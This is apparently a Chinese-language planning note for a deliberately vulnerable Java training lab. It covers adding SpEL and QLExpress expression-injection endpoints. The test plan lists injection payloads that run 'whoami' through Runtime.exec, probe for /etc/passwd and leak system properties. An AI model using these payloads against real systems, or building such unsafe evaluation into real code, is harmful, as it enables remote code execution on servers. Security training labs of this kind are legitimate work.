# Current Goal

## Goal

**G03: 表达式注入（中危）** - 添加 SpEL 和 QLExpress 表达式注入漏洞

## Current State

实现已完成，编译通过。

## Confirmed Approach

**范围：** SpEL (2个端点) + QLExpress (1个端点)
**依赖：** SpEL 使用 Spring 自带，QLExpress 需添加 `com.alibaba:qlexpress:3.2.0`
**版本：** 仅漏洞版本（不实现安全版本）

## Acceptance Criteria

- [x] 在 pom.xml 添加 QLExpress 依赖
- [x] 创建 SpelController.java
- [x] 创建 QLExpressController.java
- [x] 实现 `/spel/vuln1` 端点（直接 SpEL 解析）
- [x] 实现 `/spel/vuln2` 端点（包装后的 SpEL 解析）
- [x] 实现 `/qlexpress/vuln` 端点
- [x] 实现 `/qlexpress/vuln2` 端点
- [x] 创建 validation/payloads/expression_payloads.txt
- [x] 更新 validation/quick_validate.sh 添加表达式注入测试
- [x] 编译测试通过

## Test Plan

### SpEL 测试
1. `/spel/vuln1?expression=T(java.lang.Runtime).getRuntime().exec('whoami')` - RCE
2. `/spel/vuln1?expression=new java.io.File('/etc/passwd').exists()` - 文件检测
3. `/spel/vuln2?expression=#{T(java.lang.Runtime).getRuntime().exec('whoami')}` - 包装式

### QLExpress 测试
1. `/qlexpress/vuln?expression=Runtime.getRuntime().exec("whoami")` - RCE
2. `/qlexpress/vuln?expression=System.getProperty("user.name")` - 信息泄露

## Implementation Plan

### Task 1: 添加 QLExpress 依赖

文件路径: `java-vuln-lab/pom.xml`

添加依赖:
```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>qlexpress</artifactId>
    <version>3.2.0</version>
</dependency>
```

### Task 2: 创建 ExpressionController.java

文件路径: `java-vuln-lab/src/main/java/com/vulnlab/controller/ExpressionController.java`

端点列表:
1. `/spel/vuln1` - SpEL 表达式注入（直接使用 StandardEvaluationContext）
2. `/spel/vuln2` - SpEL 表达式注入（使用模板解析）
3. `/qlexpress/vuln` - QLExpress 表达式注入

### Task 3: 创建验证 Payload 文件

文件路径: `validation/payloads/expression_payloads.txt`

包含 SpEL 和 QLExpress 的 payload 示例

### Task 4: 更新验证脚本

在 `validation/quick_validate.sh` 添加表达式注入测试

### Task 5: 编译测试

- `mvn clean compile`
- 启动应用验证端点可访问

## Blockers

- 无

## Open Questions

- 无

## Sync Notes

- 2026-03-31: G02 同步完成，启动 G03 设计
- 2026-03-31: 设计已确认，范围包含 SpEL + QLExpress
